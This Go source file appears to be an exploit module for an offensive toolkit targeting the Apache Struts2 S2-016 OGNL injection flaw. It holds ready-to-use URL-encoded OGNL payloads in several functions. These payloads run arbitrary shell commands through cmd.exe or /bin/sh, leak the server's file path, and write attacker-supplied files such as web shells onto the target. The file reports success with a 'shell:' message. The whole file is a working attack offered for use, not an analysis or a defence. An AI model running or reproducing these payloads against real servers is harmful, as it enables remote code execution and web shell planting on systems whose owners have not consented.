package exp_Struts2

import (
	"encoding/base64"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
	"strings"
)

type Exp_S2_016 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_S2_016) Attack_cmd1() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	shellPayload := `?&redirect:%24%7B%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23a%3D%23parameters.reqobj%5B0%5D%2C%23c%3D%23parameters.reqobj%5B1%5D%2C%23req%3D%23context.get(%23a)%2C%23hh%3D%23context.get(%23parameters.rpsobj%5B0%5D)%2C%23osname%3D%40java.lang.System%40getProperty(%23parameters.os_name)%2C%23list%3D%23osname.startsWith(%23parameters.windows)%3Fnew%20java.lang.String%5B%5D%7B%23parameters.cmdexe%2C%23parameters.ccc_c%2C%23parameters.cmd%7D%3Anew%20java.lang.String%5B%5D%7B%23parameters.binbash%2C%23parameters.ccc%2C%23parameters.cmd%7D%2C%23aa%3D(new%20java.lang.ProcessBuilder(%23list)).start()%2C%23bb%3D%23aa.getInputStream()%2C%23hh.getWriter().println(new%20java.lang.String(new%20org.apache.commons.io.IOUtils().toByteArray(%23bb),%23parameters.gbk))%2C%23hh.getWriter().flush()%2C%23hh.getWriter().close()%7D&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&reqobj=/&cmd=lz520520&reqobj=struts.txt&content=fb98ab9159f51fd0&os_name=os.name&windows=Windows&binbash=/bin/sh&ccc=-c&cmdexe=cmd.exe&ccc_c=/c&gbk=iso-8859-1`
	cmd = url.PathEscape(cmd)
	shellPayload = strings.Replace(shellPayload, "lz520520", cmd, 1)
	target := strings.TrimRight(self.Params.BaseParam.Target, "?") + shellPayload
	// 发送请求
	httpresp := self.HttpGet(target, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return
}
func (self *Exp_S2_016) Attack_getmsg1() (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	shellPayload := `?&redirect:%24%7B%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23a%3D%23parameters.reqobj%5B0%5D%2C%23c%3D%23parameters.reqobj%5B1%5D%2C%23req%3D%23context.get(%23a)%2C%23b%3D%23req.getRealPath(%23c)%2C%23hh%3D%23context.get(%23parameters.rpsobj%5B0%5D)%2C%23hh.getWriter().println(%23b)%2C%23hh.getWriter().flush()%2C%23hh.getWriter().close()%7D&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&reqobj=/`
	target := strings.TrimRight(self.Params.BaseParam.Target, "?") + shellPayload
	// 发送请求
	httpresp := self.HttpGetWithoutRedirect(target, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return
}
func (self *Exp_S2_016) Attack_upload1() (expResult exp_model.ExpResult) {
	filename := self.MustGetStringParam("filename")
	content := self.MustGetStringParam("content")
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	shellPayload := `?&redirect:%24%7B%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23a%3D%23parameters.reqobj%5B0%5D%2C%23c%3D%23parameters.reqobj%5B1%5D%2C%23req%3D%23context.get(%23a)%2C%23b%3D%23parameters.upfilepath%2C%23fos%3Dnew%20java.io.FileOutputStream(%23b)%2C%23fos.write(new%20sun.misc.BASE64Decoder().decodeBuffer(%23parameters.content%5B0%5D))%2C%23fos.close()%2C%23hh%3D%23context.get(%23parameters.rpsobj%5B0%5D)%2C%23hh.getWriter().println(%23b%5B0%5D)%2C%23hh.getWriter().flush()%2C%23hh.getWriter().close()%7D&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&reqobj=/&upfilepath=lzfilename`
	shellPayload = strings.Replace(shellPayload, "lzfilename", url.QueryEscape(filename), 1)
	target := strings.TrimRight(self.Params.BaseParam.Target, "?") + shellPayload
	data := "content=" + url.QueryEscape(base64.StdEncoding.EncodeToString([]byte(content)))
	headers["Content-Type"] = []string{"application/x-www-form-urlencoded"}

	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(target, data, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	keyword := ""
	if len(httpresp.Body) > len(filename)+10 {
		keyword = httpresp.Body[:len(filename)+10]
	} else {
		keyword = httpresp.Body
	}
	if strings.Contains(keyword, filename) {
		expResult.Status = true
		self.EchoSuccessMsg("shell: %s", httpresp.Body)
	}

	return
}

func (self *Exp_S2_016) Attack_cmd2() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	shellPayload := `redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27lz520520%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}`
	cmd = url.QueryEscape(cmd)
	shellPayload = strings.Replace(shellPayload, "lz520520", cmd, 1)
	headers["Content-Type"] = []string{"application/x-www-form-urlencoded"}
	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(self.Params.BaseParam.Target, shellPayload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return
}

func (self *Exp_S2_016) Attack_upload2() (expResult exp_model.ExpResult) {
	filename := self.MustGetStringParam("filename")
	content := self.MustGetStringParam("content")
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	shellPayload := `redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.getWriter().print(%22oko%22),%23res.getWriter().print(%22kok/%22),%23res.getWriter().print(%23req.getContextPath()),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%22lzfilename%22)).append(%23req.getParameter(%22shell%22)).close()}&shell=lzcontent`
	headers["Content-Type"] = []string{"application/x-www-form-urlencoded"}
	shellPayload = strings.Replace(shellPayload, "lzfilename", url.QueryEscape(filename), 1)
	shellPayload = strings.Replace(shellPayload, "lzcontent", url.QueryEscape(content), 1)

	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(self.Params.BaseParam.Target, shellPayload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	keyword := ""
	if len(httpresp.Body) > 10 {
		keyword = httpresp.Body[:10]
	} else {
		keyword = httpresp.Body
	}
	if strings.Contains(keyword, "okokok/") {
		expResult.Status = true
		self.EchoSuccessMsg("shell: %s", httpresp.Body)
	}
	expResult.RawResult = httpresp.RawFullResp

	return
}

func init() {

	exp_register.ExpStructRegister(&Exp_S2_016{}, "exp_S2_016.yml")
}
